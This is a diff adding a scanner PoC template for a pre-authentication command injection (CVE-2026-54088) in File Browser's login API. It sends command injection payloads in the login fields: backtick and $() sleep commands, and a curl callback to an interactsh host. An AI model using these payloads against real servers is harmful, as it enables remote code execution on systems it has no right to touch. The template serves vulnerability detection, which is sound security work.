@@ -1,0 +1,72 @@
+[info]
+author = "AVE"
+description = "检测File Browser登录接口中Hook Authentication功能的OS命令注入漏洞(CVE-2026-54088)。攻击者在用户名或密码字段注入shell元字符可导致预认证远程代码执行。"
+id = "POC-AVE-2026-0480"
+name = "File Browser Hook认证命令注入预认证RCE PoC"
+severity = "critical"
+tags = [
+    "cve-2026-54088",
+    "file-browser",
+    "command-injection",
+    "rce",
+    "pre-auth",
+]
+vuln_id = [
+    "CVE-2026-54088",
+    "AVE-2026-0480",
+    "GHSA-m93h-4hw7-5qcm",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/login"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"`sleep 5`","password":"test","recaptcha":""}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/login"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"$(sleep 5)","password":"test","recaptcha":""}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/login"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"username":"test","password":"`curl http://{{interactsh-url}}`","recaptcha":""}'
+type = "json"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
